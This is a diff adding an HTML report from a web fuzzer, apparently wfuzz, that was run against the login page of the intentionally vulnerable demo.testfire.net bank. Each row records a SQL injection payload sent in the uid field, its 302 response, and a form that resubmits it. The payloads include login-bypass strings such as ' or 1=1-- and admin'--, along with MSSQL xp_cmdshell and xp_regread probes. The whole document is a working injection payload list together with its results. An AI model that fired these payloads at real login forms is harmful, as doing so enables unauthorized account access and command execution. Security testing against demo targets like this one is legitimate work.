@@ -1,0 +1,879 @@
+<html><head></head><body bgcolor=#000000 text=#FFFFFF><h1>Fuzzing http://demo.testfire.net/bank/login.jsp</h1>
+<table border="1">
+<tr><td>#request</td><td>Code</td><td>#lines</td><td>#words</td><td>Url</td></tr>
+
+<tr><td>00005</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00009</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>=%20'</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="=%20'"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00001</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00002</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>"</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="""><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00003</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>#</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="#"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00004</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>-</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="-"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00006</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'%20--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'%20--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00007</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>--';</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="--';"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00008</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'%20;</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'%20;"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00010</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>=%20;</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="=%20;"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00011</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>=%20--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="=%20--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00012</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>\x23</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="\x23"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00013</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>\x27</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="\x27"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00014</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>\x3D%20\x3B'</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="\x3D%20\x3B'"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00015</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>\x3D%20\x27</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="\x3D%20\x27"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00016</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>\x27\x4F\x52 SELECT *</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="\x27\x4F\x52 SELECT *"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00017</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>\x27\x6F\x72 SELECT *</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="\x27\x6F\x72 SELECT *"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00018</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'or%20select *</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'or%20select *"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00019</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>admin'--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="admin'--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00020</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td><>"'%;)(&+</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="<>"'%;)("><input type="hidden" name="+" value="None"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00030</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>" or 0=0 #</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="" or 0=0 #"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00021</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'%20or%20''='</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'%20or%20''='"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00022</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'%20or%20'x'='x</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'%20or%20'x'='x"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00023</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>"%20or%20"x"="x</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value=""%20or%20"x"="x"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00024</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>')%20or%20('x'='x</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="')%20or%20('x'='x"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00025</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>0 or 1=1</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="0 or 1=1"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00026</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or 0=0 --</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or 0=0 --"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00027</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>" or 0=0 --</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="" or 0=0 --"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00028</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>or 0=0 --</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="or 0=0 --"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00029</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or 0=0 #</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or 0=0 #"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00035</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>"' or 1 --'"</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value=""' or 1 --'""><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00039</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or 1=1 or ''='</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or 1=1 or ''='"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00032</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or 1=1--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or 1=1--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00033</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>" or 1=1--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="" or 1=1--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00034</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or '1'='1'--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or '1'='1'--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00036</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>or 1=1--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="or 1=1--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00037</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>or%201=1</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="or%201=1"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00038</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>or%201=1 --</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="or%201=1 --"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00040</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>" or 1=1 or ""="</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="" or 1=1 or ""=""><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00031</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>or 0=0 #</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="or 0=0 #"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00041</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or a=a--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or a=a--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00042</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>" or "a"="a</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="" or "a"="a"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00044</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>") or ("a"="a</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="") or ("a"="a"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00045</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>hi" or "a"="a</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="hi" or "a"="a"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00046</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>hi" or 1=1 --</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="hi" or 1=1 --"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00047</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>hi' or 1=1 --</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="hi' or 1=1 --"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00048</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>hi' or 'a'='a</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="hi' or 'a'='a"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00049</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>hi') or ('a'='a</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="hi') or ('a'='a"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00050</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>hi") or ("a"="a</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="hi") or ("a"="a"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00043</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>') or ('a'='a</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="') or ('a'='a"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00051</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'hi' or 'x'='x';</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'hi' or 'x'='x';"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00052</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>@variable</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="@variable"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00056</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>select</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="select"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00057</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>insert</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="insert"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00058</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>as</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="as"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00059</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>or</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="or"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00060</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>procedure</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="procedure"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00053</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>,@variable</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value=",@variable"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00054</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>PRINT</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="PRINT"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00055</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>PRINT @@variable</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="PRINT @@variable"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00061</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>limit</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="limit"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00062</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>order by</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="order by"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00063</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>asc</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="asc"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00064</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>desc</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="desc"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00065</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>delete</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="delete"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00066</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>update</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="update"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00067</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>distinct</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="distinct"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00068</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>having</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="having"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00069</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>truncate</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="truncate"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00070</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>replace</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="replace"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00071</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>like</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="like"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00072</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>handler</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="handler"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00074</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or username like '%</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or username like '%"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00075</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or uname like '%</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or uname like '%"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00076</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or userid like '%</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or userid like '%"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00077</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or uid like '%</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or uid like '%"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00078</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or user like '%</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or user like '%"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00079</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>exec xp</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="exec xp"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00080</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>exec sp</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="exec sp"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00073</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>bfilename</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="bfilename"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00081</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'; exec master..xp_cmdshell</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'; exec master..xp_cmdshell"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00082</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'; exec xp_regread</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'; exec xp_regread"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00084</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>--sp_password</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="--sp_password"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
